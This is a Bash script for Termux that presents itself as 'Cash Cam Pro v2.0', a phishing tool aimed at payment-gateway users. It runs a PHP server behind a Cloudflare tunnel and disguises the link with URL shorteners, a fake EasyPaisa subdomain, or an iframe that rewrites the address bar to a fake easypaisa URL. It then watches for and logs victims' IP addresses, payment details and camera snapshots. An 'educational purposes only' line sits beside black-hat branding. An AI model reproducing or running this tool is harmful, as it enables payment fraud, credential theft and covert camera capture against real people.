#!/bin/bash
# coded by: ATHEX H4CK3R 🔥
# Cash Cam Pro v2.0 - Payment Gateway Phishing Tool with URL Masking
clear

# Install dependencies
termux-setup-storage
pkg install php -y
pkg install wget -y
pkg install curl -y
pkg install cloudflared -y
clear

trap 'printf "\n";stop' 2

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# ============ ANIMATION FUNCTIONS ============

animate_banner() {
    echo -e "\033[?25l"
    local colors=("\e[1;92m" "\e[1;97m" "\e[1;96m" "\e[1;93m" "\e[1;32m" "\e[1;92m")
    local frame=0
    
    while [ $frame -lt 10 ]; do
        clear
        color=${colors[$((RANDOM % ${#colors[@]}))]}
        
        printf "\n\n"
        printf "    ${color}\e[0m\n"
        printf "    ${color}                                                                       \e[0m\n"
        printf "    ${color}   ██████╗ █████╗ ███████╗██╗  ██╗     ██████╗ █████╗ ███╗   ███╗      \e[0m\n"
        printf "    ${color}  ██╔════╝██╔══██╗██╔════╝██║  ██║    ██╔════╝██╔══██╗████╗ ████║      \e[0m\n"
        printf "    ${color}  ██║     ███████║███████╗███████║    ██║     ███████║██╔████╔██║      \e[0m\n"
        printf "    ${color}  ██║     ██╔══██║╚════██║██╔══██║    ██║     ██╔══██║██║╚██╔╝██║      \e[0m\n"
        printf "    ${color}  ╚██████╗██║  ██║███████║██║  ██║    ╚██████╗██║  ██║██║ ╚═╝ ██║      \e[0m\n"
        printf "    ${color}   ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝      \e[0m\n"
        printf "    ${color}                                                                       \e[0m\n"
        printf "    ${color}                     C A S H   C A M   P R O                           \e[0m\n"
        printf "    ${color}\e[0m\n"
        
        sleep 0.08
        ((frame++))
    done
    echo -e "\033[?25h"
}

banner() {
    clear
    printf "\e[0m\n\n"
    
    printf " \e[1;92m   ██████╗ █████╗ ███████╗██╗  ██╗       ██████╗ █████╗ ███╗   ███╗\e[0m\n"
    printf " \e[1;92m  ██╔════╝██╔══██╗██╔════╝██║  ██║      ██╔════╝██╔══██╗████╗ ████║\e[0m\n"
    printf " \e[1;32m  ██║     ███████║███████╗███████║      ██║     ███████║██╔████╔██║\e[0m\n"
    printf " \e[1;32m  ██║     ██╔══██║╚════██║██╔══██║\e[0m\n"
    printf " \e[1;92m  ╚██████╗██║  ██║███████║██║  ██║\e[0m\n"
    printf " \e[1;92m   ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\e[0m\n"
    printf "\n"
    printf " \e[1;93m  💰══════════════════════════════════════💰\e[0m\n"
    printf " \e[1;97m     \e[1;92mCreated By: \e[1;91mA T H E X   \e[1;96mBLACK HAT\e[0m\n"
    printf " \e[1;97m     \e[1;95mTool: \e[1;93mCash Cam Pro v2.0\e[0m\n"
    printf " \e[1;97m     \e[1;96mFeature: \e[1;92mURL Masking + Payment Gateway\e[0m\n"
    printf " \e[1;93m  💰══════════════════════════════════════💰\e[0m\n"
    printf "\n"
    printf " \e[1;97m  \e[0m\n"
    printf " \e[1;97m    \e[1;92m📱 Payment Phishing + Camera Snap      \e[1;97m\e[0m\n"
    printf " \e[1;97m    \e[1;91m⚠  For Educational Purposes Only!    \e[1;97m\e[0m\n"
    printf " \e[1;97m  \e[0m\n"
    printf "\n"
}

loading() {
    local spin='⣾⣽⣻⢿⡿⣟⣯⣷'
    echo -ne "\e[?25l"
    printf "\n    \e[1;97m[\e[1;96m⏳\e[1;97m] \e[1;93m%s \e[0m" "$1"
    for i in $(seq 1 10); do
        printf "\r    \e[1;97m[\e[1;96m%s\e[1;97m] \e[1;92m%s %s\e[0m" "${spin:$((i % 8)):1}" "$1" "$(printf '▰%.0s' $(seq 1 $i))"
        sleep 0.15
    done
    echo -e "\e[?25h"
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92m%s - Done!\e[0m\n" "$1"
}

countdown() {
    local sec=$1
    while [ $sec -gt 0 ]; do
        printf "\r    \e[1;97m[\e[1;96m⏱\e[1;97m] \e[1;95mStarting in \e[1;93m%02d\e[1;95m sec... \e[0m" "$sec"
        sleep 1
        ((sec--))
    done
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mDone!                    \e[0m\n"
}

stop() {
    printf "\n\n    \e[1;97m[\e[1;91m\e[1;97m] \e[1;91mStopping all processes...\e[0m\n"
    for i in $(seq 1 3); do
        printf "\r    \e[1;91m⏹  Terminating"
        for j in $(seq 1 $i); do printf "."; done
        sleep 0.3
    done
    
    pkill -f "php -S" > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    killall php > /dev/null 2>&1
    killall cloudflared > /dev/null 2>&1
    
    rm -rf .cld.log .masked_url.txt mask.html mask_redirect/ .cloak_cld.log .redirect_cld.log ip.txt 2>/dev/null
    
    printf "\r    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92mAll processes terminated!\e[0m\n"
    printf "    \e[1;97m[\e[1;93m\e[1;97m] \e[1;93mGoodbye!\e[0m\n\n"
    sleep 1
    exit 1
}

dependencies() {
    printf "\n    \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m DEPENDENCY CHECK             \e[1;97m\e[0m\n"
    printf "    \e[1;97m\e[0m\n\n"
    
    for pkg in php cloudflared wget curl; do
        command -v $pkg > /dev/null 2>&1 && printf "    \e[1;97m[\e[1;92m✓\e[1;97m] \e[1;92m$pkg\e[0m\n" || { printf "    \e[1;97m[\e[1;91m✗\e[1;97m] \e[1;91m$pkg\e[0m - Installing...\n"; pkg install $pkg -y > /dev/null 2>&1; }
    done
    
    printf "\n    \e[1;97m[\e[1;92m✅\e[1;97m] \e[1;92mAll dependencies ready!\e[0m\n"
}

# ============ URL MASKING (Short version - same functions, shortened for space) ============

mask_url_shortener() {
    local original_url="$1"
    printf "\n    \e[1;97m[\e[1;96m1\e[1;97m] is.gd  \e[1;96m[2\e[1;97m] TinyURL  \e[1;96m[3\e[1;97m] da.gd\n"
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] Select [1-3]: "; read -r opt
    loading "Shortening URL"
    case $opt in
        1) masked_url=$(curl -s "https://is.gd/create.php?format=simple&url=$original_url") ;;
        2) masked_url=$(curl -s "https://tinyurl.com/api-create.php?url=$original_url") ;;
        *) masked_url=$(curl -s "https://da.gd/s?url=$original_url") ;;
    esac
    [[ -n "$masked_url" && ${#masked_url} -gt 5 ]] && { echo "$masked_url" > .masked_url.txt; printf "\n    \e[1;92m✓ Masked: \e[1;93m%s\e[0m\n" "$masked_url"; } || { echo "$original_url" > .masked_url.txt; printf "\n    \e[1;91m✗ Failed! Using original.\e[0m\n"; }
}

mask_url_serveo_subdomain() {
    printf "\n    \e[1;97m[\e[1;96m→\e[1;97m] Subdomain name: "; read -r sub
    [[ -z "$sub" ]] && sub="easypaisa-$RANDOM"
    masked_url="https://${sub}.serveo.net"
    echo "$masked_url" > .masked_url.txt
    printf "\n    \e[1;92m✓ Masked: \e[1;93m%s\e[0m\n" "$masked_url"
}

mask_url_html_cloak() {
    local original_url="$1"
    printf "    \e[1;97m[\e[1;96m→\e[1;97m] Fake URL: "; read -r fake_url
    printf "    \e[1;97m[\e[1;96m→\e[1;97m] Title: "; read -r page_title
    [[ -z "$fake_url" ]] && fake_url="https://easypaisa.com.pk/verify"
    [[ -z "$page_title" ]] && page_title="EasyPaisa - Secure Payment"
    
    cat > "$SCRIPT_DIR/mask.html" << EOFHTML
<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta property="og:title" content="$page_title"><meta property="og:description" content="Fast & Secure Payments">
<title>$page_title</title><style>body{margin:0;overflow:hidden}iframe{width:100vw;height:100vh;border:none}</style>
<script>history.pushState({},"$page_title","$fake_url")</script></head>
<body><iframe src="$original_url"></iframe></body></html>
EOFHTML
    
    fuser -k 4444/tcp > /dev/null 2>&1
    cd "$SCRIPT_DIR" && php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 2
    cloudflared tunnel --url http://127.0.0.1:4444 > .cloak_cld.log 2>&1 & sleep 8
    cloak_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .cloak_cld.log | head -n1)
    [[ -n "$cloak_link" ]] && { echo "$cloak_link" > .masked_url.txt; printf "\n    \e[1;92m✓ Cloaked: \e[1;93m%s\e[0m\n" "$cloak_link"; } || { echo "$original_url" > .masked_url.txt; printf "\n    \e[1;91m✗ Failed!\e[0m\n"; }
}

mask_url_custom_redirect() {
    local original_url="$1"
    mkdir -p "$SCRIPT_DIR/mask_redirect"
    echo "<?php header('Location: $original_url'); exit; ?>" > "$SCRIPT_DIR/mask_redirect/index.php"
    fuser -k 5555/tcp > /dev/null 2>&1
    cd "$SCRIPT_DIR" && php -S 127.0.0.1:5555 -t mask_redirect/ > /dev/null 2>&1 & sleep 2
    cloudflared tunnel --url http://127.0.0.1:5555 > .redirect_cld.log 2>&1 & sleep 8
    redirect_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .redirect_cld.log | head -n1)
    [[ -n "$redirect_link" ]] && { echo "$redirect_link" > .masked_url.txt; printf "\n    \e[1;92m✓ Redirect: \e[1;93m%s\e[0m\n" "$redirect_link"; } || { echo "$original_url" > .masked_url.txt; printf "\n    \e[1;91m✗ Failed!\e[0m\n"; }
}

url_masking_menu() {
    local original_url="$1"
    printf "\n    \e[1;97m\e[0m\n"
    printf "    \e[1;97m     \e[1;93m URL MASKING MENU              \e[1;97m\e[0m\n"
    printf "    \e[1;97m                                      \e[0m\n"
    printf "    \e[1;97m  \e[1;96m[1] \e[1;92mURL Shortener                  \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[2] \e[1;93mCustom Subdomain               \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[3] \e[1;95mHTML Cloaking                  \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[4] \e[1;96mCustom Redirect                \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[5] \e[1;91mNo Masking                     \e[1;97m\e[0m\n"
    printf "    \e[1;97m\e[0m\n"
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] Select [1-5]: "; read -r mask_option
    
    case $mask_option in
        1) mask_url_shortener "$original_url" ;;
        2) mask_url_serveo_subdomain "$original_url" ;;
        3) mask_url_html_cloak "$original_url" ;;
        4) mask_url_custom_redirect "$original_url" ;;
        5) echo "$original_url" > .masked_url.txt; printf "\n    \e[1;92m✓ Direct link (no masking)\e[0m\n" ;;
        *) echo "$original_url" > .masked_url.txt; printf "\n    \e[1;91m✗ Invalid! Using direct link.\e[0m\n" ;;
    esac
}

# ============ MONITORING ============

catch_ip() {
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    printf "\n    \e[1;92m TARGET CONNECTED! \e[1;93mIP: %s\e[0m\n" "$ip"
    echo "=== $(date) ===" >> captured_data.log
    echo "IP: $ip" >> captured_data.log
    cat ip.txt >> saved.ips.txt
}

catch_payment() {
    printf "\n    \e[1;93m PAYMENT DATA CAPTURED!\e[0m\n"
    [[ -f "payments.log" ]] && tail -10 payments.log
    echo -e "\a"
}

catch_camera() {
    printf "\n    \e[1;91m CAMERA SNAP CAPTURED!\e[0m\n"
    echo -e "\a\a"
}

checkfound() {
    printf "\n    \e[1;92m MONITORING TARGETS... (\e[1;91mCtrl+C to stop\e[1;92m)\e[0m\n\n"
    local anim=0; local spin='◐◓◑◒'; local last_size=0
    
    while true; do
        if [[ -e "ip.txt" ]]; then catch_ip; rm -rf ip.txt; fi
        if [[ -e "Log.log" ]]; then catch_camera; rm -rf Log.log; fi
        if [[ -e "payments.log" ]]; then
            local new_size=$(wc -c < payments.log 2>/dev/null)
            [[ -n "$last_size" && "$new_size" != "$last_size" ]] && catch_payment
            last_size="$new_size"
        fi
        printf "\r    \e[1;96m[%s]\e[1;97m Waiting for targets...\e[0m" "${spin:$((anim % 4)):1}"
        ((anim++)); sleep 0.4
    done
}

# ============ SERVER ============

cloudflared_server() {
    loading "Starting Server"
    
    # Cleanup
    pkill -f "php -S" > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    fuser -k 3333/tcp > /dev/null 2>&1
    sleep 2
    
    # CHANGE TO SCRIPT DIRECTORY
    cd "$SCRIPT_DIR"
    
    # Create index.php if not exists
    if [[ ! -f "index.php" ]]; then
        cat > index.php << 'EOF'
<?php
include 'ip.php';
header('Location: index.html');
exit;
?>
EOF
    fi
    
    loading "PHP Server on Port 3333"
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    sleep 3
    
    # Verify PHP is running
    curl -s http://127.0.0.1:3333/index.html > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        printf "\n    \e[1;91m[✗] PHP server failed! Check if index.html exists.\e[0m\n"
        sleep 2
        main_menu
        return
    fi
    
    loading "Cloudflared Tunnel"
    cloudflared tunnel --url http://127.0.0.1:3333 > .cld.log 2>&1 &
    sleep 10
    
    # Extract URL
    cldflared_link=""
    for i in $(seq 1 5); do
        cldflared_link=$(grep -o 'https://[0-9a-z-]*\.trycloudflare\.com' .cld.log | head -n1)
        [[ -n "$cldflared_link" ]] && break
        sleep 2
    done
    
    if [[ -z "$cldflared_link" ]]; then
        printf "\n    \e[1;91m[✗] Failed to get URL! Check internet.\e[0m\n"
        sleep 2
        main_menu
        return
    fi
    
    printf "\n    \e[1;97m /................................................/\e[0m\n"
    printf "    \e[1;97m     \e[1;92m  TUNNEL ACTIVE                      \e[1;97m\e[0m\n"
    printf "    \e[1;97m   \e[1;96m URL: \e[1;93m%s\e[0m  \e[1;97m║\e[0m\n" "$cldflared_link"
    printf "    \e[1;97m   \e[1;92m Panel: \e[1;93m%s/panel.html\e[0m  \e[1;97m\e[0m\n" "$cldflared_link"
    printf "    \e[1;97m/.................................................../\e[0m\n"
    
    # Masking
    url_masking_menu "$cldflared_link"
    masked_url=$(cat .masked_url.txt 2>/dev/null)
    [[ -n "$masked_url" ]] && printf "\n    \e[1;92m Final Masked URL: \e[1;93m%s\e[0m\n" "$masked_url"
    
    echo "$cldflared_link" > phishing_link.txt
    checkfound
}

# ============ MENU ============

main_menu() {
    printf "\n    \e[1;97m\e[0m\n"
    printf "    \e[1;97m    \e[1;92m CASH CAM PRO v2.0           \e[1;97m\e[0m\n"
    printf "    \e[1;97m                                      │\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[01] \e[1;92mStart Phishing Server          \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[02] \e[1;93mView Captured Data             \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[03] \e[1;95mClear All Logs                 \e[1;97m\e[0m\n"
    printf "    \e[1;97m  \e[1;96m[04] \e[1;91mExit                           \e[1;97m\e[0m\n"
    printf "    \e[1;97m\e[0m\n"
    printf "    \e[1;97m[\e[1;96m?\e[1;97m] Select [1-4]: "; read -r opt
    
    case $opt in
        1) start_phishing ;;
        2) view_data ;;
        3) clear_logs ;;
        4) stop ;;
        *) printf "\n    \e[1;91m[✗] Invalid!\e[0m\n"; sleep 1; main_menu ;;
    esac
}

start_phishing() {
    cd "$SCRIPT_DIR"
    
    # Check required files
    local missing=0
    [[ ! -f "index.html" ]] && { printf "\n    \e[1;91m[✗] index.html missing!\e[0m\n"; missing=1; }
    [[ ! -f "post.php" ]] && { printf "\n    \e[1;91m[✗] post.php missing!\e[0m\n"; missing=1; }
    [[ ! -f "ip.php" ]] && { printf "\n    \e[1;91m[✗] ip.php missing!\e[0m\n"; missing=1; }
    
    if [ $missing -eq 1 ]; then
        printf "\n    \e[1;93m[!] Place all files in: %s\e[0m\n" "$SCRIPT_DIR"
        sleep 3
        main_menu
        return
    fi
    
    cloudflared_server
}

view_data() {
    clear
    printf "\n    \e[1;93m CAPTURED DATA VIEWER\e[0m\n\n"
    [[ -f "captured_data.log" ]] && { printf "    \e[1;92m IPs:\e[0m\n"; cat captured_data.log; } || printf "    \e[1;93m[!] No IP data\n"
    [[ -f "payments.log" ]] && { printf "\n    \e[1;92m Payments:\e[0m\n"; tail -15 payments.log; } || printf "\n    \e[1;93m[!] No payments\n"
    ls cam*.png >/dev/null 2>&1 && { printf "\n    \e[1;92m Snaps:\e[0m\n"; ls -la cam*.png | tail -5; } || printf "\n    \e[1;93m[!] No camera snaps\n"
    printf "\n    \e[1;97m[↩] Press Enter..."; read -r; main_menu
}

clear_logs() {
    printf "\n    \e[1;93m[!] Delete all data? [y/N]: "; read -r confirm
    [[ $confirm == "y" || $confirm == "Y" ]] && { rm -rf captured_data.log payments.log Log.log ip.txt saved.ips.txt cam*.png .cld.log .masked_url.txt mask.html mask_redirect/ phishing_link.txt .cloak_cld.log .redirect_cld.log 2>/dev/null; printf "    \e[1;92m[✓] Cleared!\e[0m\n"; } || printf "    \e[1;97m[✓] Cancelled.\e[0m\n"
    sleep 1; main_menu
}

# ============ START ============
animate_banner
banner
dependencies
countdown 1
main_menu
